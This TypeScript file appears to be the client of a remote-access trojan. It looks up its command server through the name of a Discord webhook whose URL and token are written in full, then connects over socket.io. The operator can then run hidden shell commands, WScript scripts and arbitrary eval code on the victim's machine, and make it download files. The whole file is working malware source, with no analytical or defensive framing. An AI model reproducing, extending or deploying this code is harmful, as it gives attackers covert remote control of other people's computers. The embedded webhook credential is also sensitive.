import * as SocketIO from 'socket.io-client';

import fetch from 'node-fetch';

import ExecuteModule, { ExecuteArgs } from './module/execute';
import ExecuteWScriptModule, { ExecuteWScriptArgs } from './module/execute-wscript';
import EvalModule, { EvalArgs } from './module/eval';
import DownloadModule, { DownloadArgs } from './module/download';

(async () => {
	const hostWebhook: string = 'https://discordapp.com/api/webhooks/716974155458805771/oHtXFmsFbba99GvO1haKz2zbF1iOMNBn0RNvo0GXPF3-EZS4EqtR1qsU9G6KvpL0_qO4';
	const host: string = (await (await fetch(hostWebhook)).json()).name;
	
	const client = SocketIO.connect(host, {
		transports: [
			'websocket'
		]
	});
	
	client.on('heartbeat', (id: string) => {
		//console.log(`< Heartbeat [id=${id}]`);
		client.emit('heartbeat', id);
		//console.log(`> Heartbeat [id=${id}]`);
	});
	
	client.on('connect', () => {
		console.log('< Connected');
	});
	
	client.on('module-invoke', ({ module, data: rawData }: { module: string, data: ExecuteArgs | ExecuteWScriptArgs | EvalArgs | DownloadArgs }) => {
		switch(module) {
			case 'execute': {
				const data: ExecuteArgs = rawData as ExecuteArgs;
				new ExecuteModule(client).run({
					command: data.command,
					args: data.args,
					detached: data.detached,
					hide: data.hide
				});
				console.log(`> Execute [id=${client.id}, command=${data.command}, args=${data.args}]`);
				break;
			}
	
			case 'execute-wscript': {
				const data: ExecuteWScriptArgs = rawData as ExecuteWScriptArgs;
				new ExecuteWScriptModule(client).run({
					shell: data.shell,
					script: data.script,
					args: data.args,
					detached: data.detached,
					hide: data.hide
				});
				console.log(`> Execute (WScript) [id=${client.id}, shell=${data.shell}, script=${data.script}, args=${data.args}]`);
				break;
			}
	
			case 'eval': {
				const data: EvalArgs = rawData as EvalArgs;
				new EvalModule(client).run({
					script: data.script,
					fallback: data.fallback || false
				});
				console.log(`> Eval [id=${client.id}, script=${data.script}]`);
				break;
			}
	
			case 'download': {
				const data: DownloadArgs = rawData as DownloadArgs;
				new DownloadModule(client).run({
					url: data.url,
					file: data.file
				});
				console.log(`> Download [id=${client.id}, url=${data.url}, file=${data.file}]`);
				break;
			}
	
			default:
				console.log(`Invalid module: ${module}`);
				break;
		}
	});
	
	process.on('uncaughtException', (error: Error) => {
		console.error(error);
	});	
})();
